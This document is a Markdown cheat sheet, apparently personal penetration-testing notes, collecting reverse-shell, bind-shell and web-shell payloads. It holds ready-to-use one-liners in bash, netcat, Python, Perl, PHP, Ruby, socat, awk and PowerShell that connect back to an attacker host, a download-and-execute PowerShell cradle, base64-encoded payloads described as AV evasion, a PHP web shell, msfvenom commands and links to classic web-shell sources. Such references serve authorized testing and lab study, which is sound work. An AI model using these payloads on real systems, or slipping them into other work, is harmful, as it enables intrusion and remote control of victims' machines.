# Reverse Shells

Payloads, listeners, and tooling for getting an interactive shell back from a compromised host.

## Concepts

| Type | Who connects to whom | When to use |
|:-----|:--------------------|:------------|
| **Reverse shell** | Target → Attacker | Default choice — bypasses inbound firewalls / NAT |
| **Bind shell** | Attacker → Target | Target has no outbound egress, attacker can reach it |
| **Web shell** | HTTP request → web app | RCE via uploaded/included file (`.php`, `.aspx`, `.jsp`) |

Workflow:

```
1. Start a listener on the attacker box (port reachable from target)
2. Trigger the payload on the target (RCE, upload, exec)
3. Catch the connection, then upgrade the TTY → see [[Shell_Upgrade]]
```

> [!TIP]
> Use ports that are commonly egress-allowed: `443`, `80`, `53`, `8080`. Corporate firewalls usually block weird outbound ports.

---

## Listeners (Attacker Side)

### Netcat
```bash
# Traditional netcat
nc -lvnp 4444

# -l listen, -v verbose, -n no DNS, -p port
# OpenBSD nc: same flags work
```

### Ncat (recommended — comes with Nmap)
```bash
# Plain
ncat -lvnp 4444

# With SSL (encrypted shell, evades simple IDS)
ncat --ssl -lvnp 4444

# Allow only one specific source
ncat -lvnp 4444 --allow 10.10.10.5
```

### rlwrap + nc (history & arrow keys before TTY upgrade)
```bash
rlwrap nc -lvnp 4444
```

### Socat (best for full-TTY shells)
```bash
# Plain TCP
socat -d -d TCP-LISTEN:4444 STDOUT

# Full PTY listener — pair with the socat target payload below
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### Metasploit `multi/handler`
```bash
msfconsole -q -x "use multi/handler; \
  set PAYLOAD linux/x64/shell_reverse_tcp; \
  set LHOST tun0; set LPORT 4444; \
  exploit -j"
```

> See [[Metasploit]] for payload selection and session handling.

---

## Linux / Unix Reverse Shells (Target Side)

Replace `<ATTACKER>` with your IP and `<PORT>` with the listener port (e.g. `4444`).

### Bash
```bash
# /dev/tcp pseudo-device — no extra binaries needed
bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1

# Alternate form
0<&196;exec 196<>/dev/tcp/<ATTACKER>/<PORT>; sh <&196 >&196 2>&196
```

### Netcat
```bash
# Traditional nc with -e
nc -e /bin/sh <ATTACKER> <PORT>

# OpenBSD nc (no -e) — use named pipe
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER> <PORT> > /tmp/f
```

### Python
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER>",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

### Perl
```bash
perl -e 'use Socket;$i="<ATTACKER>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```bash
php -r '$sock=fsockopen("<ATTACKER>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<ATTACKER>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Socat (full TTY immediately — no upgrade needed)
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER>:<PORT>
```

### Awk / Telnet (last-resort minimal environments)
```bash
# awk
awk 'BEGIN {s = "/inet/tcp/0/<ATTACKER>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# telnet (two-pipe trick — needs two listeners, ports 4444 and 4445)
telnet <ATTACKER> 4444 | /bin/bash | telnet <ATTACKER> 4445
```

---

## Windows Reverse Shells (Target Side)

### PowerShell (cmd-style one-liner)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()};$client.Close()"
```

### Nishang `Invoke-PowerShellTcp`
```powershell
# On attacker:  python3 -m http.server 80
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER> -Port <PORT>
```

### nc.exe
```cmd
nc.exe -e cmd.exe <ATTACKER> <PORT>
```

### Base64-encoded PowerShell (AV evasion / one-shot exec)
```powershell
# Build the encoded payload on the attacker:
$cmd = "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER>',<PORT>); ..."
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

# Run on target:
powershell -nop -w hidden -enc <BASE64_BLOB>
```

---

## Web Shells (RCE via HTTP)

### PHP one-liner (drop into upload form)
```php
<?php system($_GET['c']); ?>
```
Trigger: `http://target/upload/shell.php?c=id`

### Pre-made web shells
| Name | Path / Source | Notes |
|:-----|:--------------|:------|
| `php-reverse-shell.php` | `/usr/share/webshells/php/` (Kali) | Pentestmonkey classic, opens reverse connection |
| `cmd.aspx` | `/usr/share/webshells/aspx/` | Drop-in command exec for IIS |
| `cmd.jsp` | `/usr/share/webshells/jsp/` | Tomcat / JBoss targets |
| Weevely (stealth PHP) | `weevely generate <pass> shell.php` | Obfuscated, password-gated traffic |
| antSword / Behinder | GUI-based, encrypted traffic | Full file manager + tunneling |
| **p0wny-shell** | [github.com/flozz/p0wny-shell](https://github.com/flozz/p0wny-shell) | Minimalist single-file PHP — just command exec |
| **b374k** | [github.com/b374k/b374k](https://github.com/b374k/b374k) | Feature-rich: file manager, DB browser, command exec |
| **c99** | [r57shell.net](https://www.r57shell.net/index.php) | Classic full-feature PHP shell — file ops, DB, network tools |
| **r57** | [r57shell.net](https://www.r57shell.net/index.php) | Sister to c99, similar capability set |

---

## msfvenom Payload Generation

Pattern: `msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTFILE>`

| Target | Command |
|:-------|:--------|
| Linux ELF | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf` |
| Windows EXE | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe` |
| Windows Meterpreter | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o met.exe` |
| PHP | `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw -o shell.php` |
| ASPX | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o shell.aspx` |
| JSP | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp` |
| Stageless Python | `msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT>` |

> [!NOTE]
> **Staged** payloads (`/meterpreter/reverse_tcp`) download the rest of the payload after connect — smaller initial blob, requires the handler to be running.
> **Stageless** payloads (`/meterpreter_reverse_tcp`, no slash) ship everything at once — bigger but more reliable on flaky networks.

---

## Bind Shells

When the target has no outbound egress but accepts inbound connections.

### Listener on target
```bash
# Linux
nc -lvnp 4444 -e /bin/bash

# OpenBSD nc (no -e)
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/bash > /tmp/f
```

### Connect from attacker
```bash
nc <TARGET> 4444
```

---

## Quick Decision Matrix

| Situation | Pick |
|:----------|:-----|
| Linux box with bash | `bash -i >& /dev/tcp/...` |
| Linux box, no bash | `python3` one-liner |
| Want full TTY immediately | `socat` (both sides) |
| Windows, modern (PS 5+) | PowerShell IEX + Nishang |
| Windows, AV in the way | base64-encoded PS, or msfvenom + obfuscation |
| Web RCE, drop a file | language-matched web shell (`.php`/`.aspx`/`.jsp`) |
| Need history/arrow keys before upgrade | `rlwrap nc` |
| Encrypted traffic / IDS bypass | `ncat --ssl`, Weevely, Behinder |

---

## Tools to Have Installed

| Tool | Purpose |
|:-----|:--------|
| `nc` / `ncat` | Universal listener / connector |
| `socat` | Full-PTY shells, encrypted relays |
| `rlwrap` | Readline wrapper around nc |
| `msfvenom` | Generate payloads in any format |
| `metasploit` | `multi/handler` + post-ex modules |
| `weevely` | Stealth PHP web shell |
| `nishang` | PowerShell offensive framework |
| `revshells.com` | Web-based payload generator (offline copy: `pwncat-cs`) |

---

## References

- **revshells.com** — [revshells.com](https://www.revshells.com/) — interactive payload generator, also lists listeners
- **Pentestmonkey** — [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) — classic reverse-shell cheatsheet
- **Invicti** — [invicti.com](https://www.invicti.com/learn/reverse-shell/) — concept explainer / blog
- **HighOn.Coffee** — [highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- **GTFOBins** — [gtfobins.github.io](https://gtfobins.github.io/) — reverse shells via SUID/sudo binaries
- **PayloadsAllTheThings** — [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- **r57shell.net** — [r57shell.net](https://www.r57shell.net/index.php) — repository / mirror for classic PHP shells (c99, r57, etc.)

---

## See Also

- [[Shell_Upgrade]] — Turn the dumb reverse shell into a full TTY
- [[File_Transfer]] — Stage payloads / socat / nc on the target
- [[Metasploit]] — `multi/handler` listener and msfvenom payloads
- [[Linux_PrivEsc]] / [[Windows_PrivEsc]] — What you typically do next
- [[SSH_Tunneling]] — Pivot the shell through a tunnel when direct egress is blocked
